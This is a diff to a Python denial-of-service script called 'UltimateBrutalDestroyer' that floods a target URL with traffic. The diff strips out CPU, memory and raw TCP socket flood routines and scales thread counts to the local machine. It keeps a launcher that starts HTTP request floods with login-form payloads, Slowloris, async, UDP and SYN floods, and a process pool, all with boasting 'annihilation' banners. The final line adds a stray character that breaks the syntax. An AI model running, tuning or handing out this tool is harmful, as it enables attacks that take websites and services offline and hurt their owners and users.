@@ -25,7 +25,6 @@ import warnings
 import queue
 import logging
 import signal
-import numpy as np
 
 # Ignore all warnings
 warnings.filterwarnings('ignore')
@@ -45,16 +44,11 @@ class UltimateBrutalDestroyer:
         self.lock = threading.Lock()
         self.running = True
         
-        # System resources - OPTIMIZED FOR AMD EPYC-GENOA (4 cores, 8 threads)
-        self.cpu_count = 4  # Physical cores
-        self.cpu_threads = 8  # Logical threads (2 per core)
-        self.max_workers = 8000  # 2000 workers per core for EPYC power
-        self.max_sockets = 50000  # Maximum socket connections for EPYC
-        self.max_async_tasks = 20000  # Maximum async tasks for EPYC
-        self.max_processes = 8  # Use all logical threads
-        
-        # Thread pool for better efficiency
-        self.thread_pool = ThreadPoolExecutor(max_workers=self.max_workers)
+        # System resources - Reduced to half for Windows stability
+        self.cpu_count = multiprocessing.cpu_count()
+        self.max_workers = self.cpu_count * 250  # Reduced from 500 to 250 workers per CPU core
+        self.max_sockets = 5000  # Reduced from 10000 to 5000
+        self.max_async_tasks = 2500  # Reduced from 5000 to 2500
         
         # Parse URL
         self.parsed_url = urlparse(target_url)
@@ -359,317 +353,46 @@ class UltimateBrutalDestroyer:
         
         return local_success, local_failed
 
-    def cpu_intensive_attack(self):
-        """CPU-intensive attack to utilize all CPU cores"""
-        while self.running:
-            try:
-                # Perform heavy CPU calculations
-                for _ in range(10000):
-                    if not self.running:
-                        break
-                    # Prime number calculation (CPU intensive)
-                    n = random.randint(1000, 10000)
-                    is_prime = True
-                    for i in range(2, int(n ** 0.5) + 1):
-                        if n % i == 0:
-                            is_prime = False
-                            break
-                
-                # Matrix multiplication (memory intensive)
-                size = 100
-                matrix1 = [[random.random() for _ in range(size)] for _ in range(size)]
-                matrix2 = [[random.random() for _ in range(size)] for _ in range(size)]
-                result = [[sum(matrix1[i][k] * matrix2[k][j] for k in range(size)) 
-                          for j in range(size)] for i in range(size)]
-                
-            except Exception:
-                pass
-            
-            time.sleep(0.001)  # Minimal delay for maximum CPU usage
-
-    def memory_intensive_attack(self):
-        """Memory-intensive attack to utilize all RAM"""
-        memory_blocks = []
-        while self.running:
-            try:
-                # Allocate large memory blocks
-                for _ in range(10):
-                    if not self.running:
-                        break
-                    # Allocate 1MB blocks
-                    block = bytearray(1024 * 1024)
-                    for i in range(len(block)):
-                        block[i] = random.randint(0, 255)
-                    memory_blocks.append(block)
-                
-                # Keep only last 100 blocks to prevent memory overflow
-                if len(memory_blocks) > 100:
-                    memory_blocks = memory_blocks[-100:]
-                
-            except Exception:
-                pass
-            
-            time.sleep(0.01)
-
-    def network_flood_attack(self):
-        """Ultra-aggressive network flood"""
-        while self.running:
-            try:
-                # Create multiple socket connections
-                sockets = []
-                for _ in range(100):
-                    if not self.running:
-                        break
-                    try:
-                        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                        sock.settimeout(1)
-                        sock.connect_ex((self.host, self.port))
-                        sockets.append(sock)
-                    except Exception:
-                        pass
-                
-                # Send data to all sockets
-                for sock in sockets:
-                    try:
-                        data = os.urandom(random.randint(1024, 8192))
-                        sock.send(data)
-                    except Exception:
-                        pass
-                    finally:
-                        try:
-                            sock.close()
-                        except Exception:
-                            pass
-                
-            except Exception:
-                pass
-            
-            time.sleep(0.001)  # Ultra-fast attack
-
-    def fast_thread_pool_attack(self):
-        """Ultra-fast attack using thread pool executor"""
-        futures = []
-        
-        def single_attack():
-            try:
-                session = requests.Session()
-                session.verify = False
-                
-                headers = self.get_random_headers()
-                
-                # Mix different attack methods
-                attack_type = random.randint(1, 3)
-                
-                if attack_type == 1:  # POST attack
-                    headers['Content-Type'] = 'application/x-www-form-urlencoded'
-                    data = random.choice(self.login_payloads)
-                    response = session.post(self.target_url, headers=headers, data=data, timeout=2)
-                
-                elif attack_type == 2:  # GET attack
-                    response = session.get(self.target_url, headers=headers, timeout=2)
-                
-                else:  # HEAD attack
-                    response = session.head(self.target_url, headers=headers, timeout=2)
-                
-                with self.lock:
-                    self.successful_requests += 1
-                    
-            except Exception:
-                with self.lock:
-                    self.failed_requests += 1
-        
-        # Submit many tasks to thread pool
-        for _ in range(500):  # Reduced from 1000 to 500 tasks at once
-            if not self.running:
-                break
-            future = self.thread_pool.submit(single_attack)
-            futures.append(future)
-        
-        # Wait for completion
-        for future in futures:
-            try:
-                future.result(timeout=5)
-            except Exception:
-                pass
-
-    def epyc_optimized_attack(self):
-        """EPYC-optimized attack using all 8 logical threads"""
-        while self.running:
-            try:
-                # Use all logical threads efficiently
-                for _ in range(1000):  # Heavy workload for EPYC
-                    if not self.running:
-                        break
-                    
-                    # AVX-512 optimized calculations (EPYC supports this)
-                    size = 1000
-                    matrix1 = np.random.random((size, size))
-                    matrix2 = np.random.random((size, size))
-                    result = np.dot(matrix1, matrix2)  # Uses AVX-512
-                    
-                    # Prime number calculations using all cores
-                    for n in range(1000, 10000, 100):
-                        is_prime = True
-                        for i in range(2, int(n ** 0.5) + 1):
-                            if n % i == 0:
-                                is_prime = False
-                                break
-                
-            except Exception:
-                pass
-            
-            time.sleep(0.0001)  # Ultra-fast for EPYC
-
-    def epyc_memory_attack(self):
-        """EPYC memory attack using large cache (32MB L3)"""
-        memory_blocks = []
-        while self.running:
-            try:
-                # Utilize EPYC's large L3 cache (32MB)
-                for _ in range(20):  # More blocks for EPYC
-                    if not self.running:
-                        break
-                    # Allocate 2MB blocks to fill L3 cache
-                    block = bytearray(2 * 1024 * 1024)
-                    for i in range(0, len(block), 1024):  # Process in chunks
-                        block[i:i+1024] = os.urandom(1024)
-                    memory_blocks.append(block)
-                
-                # Keep blocks to utilize cache
-                if len(memory_blocks) > 200:  # More blocks for EPYC
-                    memory_blocks = memory_blocks[-200:]
-                
-            except Exception:
-                pass
-            
-            time.sleep(0.001)  # Fast for EPYC
-
-    def epyc_network_flood(self):
-        """EPYC-optimized network flood using all cores"""
-        while self.running:
-            try:
-                # Create more connections for EPYC power
-                sockets = []
-                for _ in range(200):  # More sockets for EPYC
-                    if not self.running:
-                        break
-                    try:
-                        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                        sock.settimeout(0.5)  # Faster timeout for EPYC
-                        sock.connect_ex((self.host, self.port))
-                        sockets.append(sock)
-                    except Exception:
-                        pass
-                
-                # Send larger data packets for EPYC
-                for sock in sockets:
-                    try:
-                        data = os.urandom(random.randint(2048, 16384))  # Larger packets
-                        sock.send(data)
-                    except Exception:
-                        pass
-                    finally:
-                        try:
-                            sock.close()
-                        except Exception:
-                            pass
-                
-            except Exception:
-                pass
-            
-            time.sleep(0.0001)  # Ultra-fast for EPYC
-
     def ultimate_destruction(self):
         """Launch all attack types simultaneously using all system resources"""
         print("🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥")
-        print("💀💀💀    AMD EPYC-GENOA ULTIMATE DESTROYER    💀💀💀")
+        print("💀💀💀    ULTIMATE BRUTAL SERVER DESTROYER    💀💀💀")
         print("🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥")
         print(f"🎯 TARGET: {self.target_url}")
         print(f"💻 CPU CORES: {self.cpu_count}")
         print(f"🧵 MAX WORKERS: {self.max_workers}")
         print(f"🔌 MAX SOCKETS: {self.max_sockets}")
         print(f"⚡ MAX ASYNC TASKS: {self.max_async_tasks}")
-        print("🚨 ALL ATTACK TYPES ACTIVE - EPYC ANNIHILATION MODE!")
+        print("🚨 ALL ATTACK TYPES ACTIVE - TOTAL ANNIHILATION MODE!")
         print("⚡ Press Ctrl+C to stop the carnage")
         print("=" * 80)
         
         # Start all attack types
         threads = []
         
-        # 1. Multi-threaded HTTP attacks - EPYC OPTIMIZED
+        # 1. Multi-threaded HTTP attacks
         print("🚀 Starting HTTP thread army...")
-        thread_batch_size = 1000  # Larger batches for EPYC
-        max_threads = 4000  # 4000 threads for EPYC power
-        
-        for batch in range(0, max_threads, thread_batch_size):
-            batch_end = min(batch + thread_batch_size, max_threads)
-            batch_threads = []
-            
-            # Create all threads in batch first
+        thread_batch_size = 100  # Create threads in batches
+        for batch in range(0, min(self.max_workers, 1000), thread_batch_size):  # Reduced from 2000 to 1000
+            batch_end = min(batch + thread_batch_size, min(self.max_workers, 1000))
             for i in range(batch, batch_end):
                 thread = threading.Thread(target=self.brutal_http_worker, args=(i,), daemon=True)
-                batch_threads.append(thread)
-            
-            # Start all threads in batch simultaneously
-            for thread in batch_threads:
                 thread.start()
                 threads.append(thread)
             
-            # Minimal delay for EPYC speed
-            time.sleep(0.0001)  # Ultra-fast for EPYC
+            # Small delay between batches
+            time.sleep(0.05)
             print(f"   Created {len(threads)} threads...")
         
         print(f"✅ HTTP thread army complete: {len(threads)} threads")
         
-        # 2. EPYC-Optimized Attacks - MAXIMUM POWER
-        print("🔥 Starting EPYC-optimized attacks...")
-        for i in range(8):  # Use all 8 logical threads
-            epyc_thread = threading.Thread(target=self.epyc_optimized_attack, daemon=True)
-            epyc_thread.start()
-            threads.append(epyc_thread)
-        
-        # 3. EPYC Memory Attacks
-        print("💾 Starting EPYC memory attacks...")
-        for i in range(4):  # 4 threads for memory (one per physical core)
-            epyc_memory_thread = threading.Thread(target=self.epyc_memory_attack, daemon=True)
-            epyc_memory_thread.start()
-            threads.append(epyc_memory_thread)
-        
-        # 4. EPYC Network Flood
-        print("🌊 Starting EPYC network flood...")
-        for i in range(8):  # 8 threads for network (all logical threads)
-            epyc_network_thread = threading.Thread(target=self.epyc_network_flood, daemon=True)
-            epyc_network_thread.start()
-            threads.append(epyc_network_thread)
-        
-        # 5. CPU-intensive attacks - OPTIMIZED FOR 4 CORES
-        print("🔥 Starting CPU-intensive attacks...")
-        for i in range(4):  # 4 threads for 4 CPU cores
-            cpu_thread = threading.Thread(target=self.cpu_intensive_attack, daemon=True)
-            cpu_thread.start()
-            threads.append(cpu_thread)
-        
-        # 6. Memory-intensive attacks - OPTIMIZED FOR 4 CORES
-        print("💾 Starting memory-intensive attacks...")
-        for i in range(2):  # 2 threads for memory usage
-            memory_thread = threading.Thread(target=self.memory_intensive_attack, daemon=True)
-            memory_thread.start()
-            threads.append(memory_thread)
-        
-        # 7. Network flood attacks - OPTIMIZED FOR 4 CORES
-        print("🌊 Starting network flood attacks...")
-        for i in range(4):  # 4 threads for network flooding
-            network_thread = threading.Thread(target=self.network_flood_attack, daemon=True)
-            network_thread.start()
-            threads.append(network_thread)
-        
-        # 8. Slowloris attack
+        # 2. Slowloris attack
         print("🐌 Starting Slowloris destroyer...")
         slowloris_thread = threading.Thread(target=self.slowloris_destroyer, daemon=True)
         slowloris_thread.start()
         threads.append(slowloris_thread)
         
-        # 9. Async attack with proper cleanup
+        # 3. Async attack with proper cleanup
         print("⚡ Starting async destroyer...")
         def run_async_attack():
             try:
@@ -702,30 +425,29 @@ class UltimateBrutalDestroyer:
         async_thread.start()
         threads.append(async_thread)
         
-        # 10. UDP flood - OPTIMIZED FOR 4 CORES
+        # 4. UDP flood
         print("💥 Starting UDP flood...")
-        for i in range(2):  # 2 threads for UDP flood
+        for i in range(self.cpu_count):
             udp_thread = threading.Thread(target=self.udp_flood_attack, daemon=True)
             udp_thread.start()
             threads.append(udp_thread)
         
-        # 11. SYN flood simulation - OPTIMIZED FOR 4 CORES
+        # 5. SYN flood simulation
         print("🔥 Starting SYN flood simulation...")
-        for i in range(4):  # 4 threads for SYN flood
+        for i in range(self.cpu_count * 2):
             syn_thread = threading.Thread(target=self.syn_flood_attack, daemon=True)
             syn_thread.start()
             threads.append(syn_thread)
         
-        # 12. Multi-process attack - EPYC OPTIMIZED
+        # 6. Multi-process attack
         print("🚀 Starting process army...")
-        process_pool = ProcessPoolExecutor(max_workers=8)  # Use all 8 logical threads
+        process_pool = ProcessPoolExecutor(max_workers=self.cpu_count)
         process_futures = []
-        for i in range(8):
+        for i in range(self.cpu_count):
             future = process_pool.submit(self.process_worker, i)
             process_futures.append(future)
         
-        print(f"💀 TOTAL DESTRUCTION INITIATED - {len(threads)} THREADS + 8 PROCESSES")
-        print("🔥 AMD EPYC-GENOA MAXIMUM POWER UTILIZATION ACTIVE!")
+        print(f"💀 TOTAL DESTRUCTION INITIATED - {len(threads)} THREADS + {self.cpu_count} PROCESSES")
         print("=" * 80)
         
         # Monitor and display stats
@@ -741,9 +463,7 @@ class UltimateBrutalDestroyer:
                       f"SUCCESS: {self.successful_requests:,} | "
                       f"FAILED: {self.failed_requests:,} | "
                       f"TIME: {elapsed:.0f}s | "
-                      f"THREADS: {len([t for t in threads if t.is_alive()])} | "
-                      f"EPYC CORES: 4/8 | "
-                      f"MAX POWER: ACTIVE", 
+                      f"THREADS: {len([t for t in threads if t.is_alive()])}", 
                       end="", flush=True)
                 
                 time.sleep(0.5)  # Faster updates
@@ -776,7 +496,7 @@ class UltimateBrutalDestroyer:
             print(f"✅ Successful: {self.successful_requests:,}")
             print(f"❌ Failed: {self.failed_requests:,}")
             print(f"🔥 Average RPS: {final_rps:.2f}")
-            print(f"💻 System Resources Used: AMD EPYC-Genoa (4 cores, 8 threads)")
+            print(f"💻 System Resources Used: {self.cpu_count} CPU cores")
             print(f"🧵 Threads Deployed: {len(threads)}")
             print("💀 SERVER ANNIHILATION COMPLETE 💀")
             print("=" * 80)
@@ -793,12 +513,6 @@ def main():
     def signal_handler(signum, frame):
         print("\n🛑 Received interrupt signal, shutting down gracefully...")
         destroyer.running = False
-        
-        # Shutdown thread pool
-        try:
-            destroyer.thread_pool.shutdown(wait=False)
-        except Exception:
-            pass
         
         # Give some time for cleanup
         time.sleep(2)
@@ -820,10 +534,6 @@ def main():
     finally:
         # Ensure cleanup
         destroyer.running = False
-        try:
-            destroyer.thread_pool.shutdown(wait=False)
-        except Exception:
-            pass
         print("🧹 Final cleanup completed")
 
 
@@ -832,4 +542,4 @@ if __name__ == "__main__":
     warnings.filterwarnings('ignore', category=RuntimeWarning)
     warnings.filterwarnings('ignore', category=DeprecationWarning)
     
-    main()
+    main()s
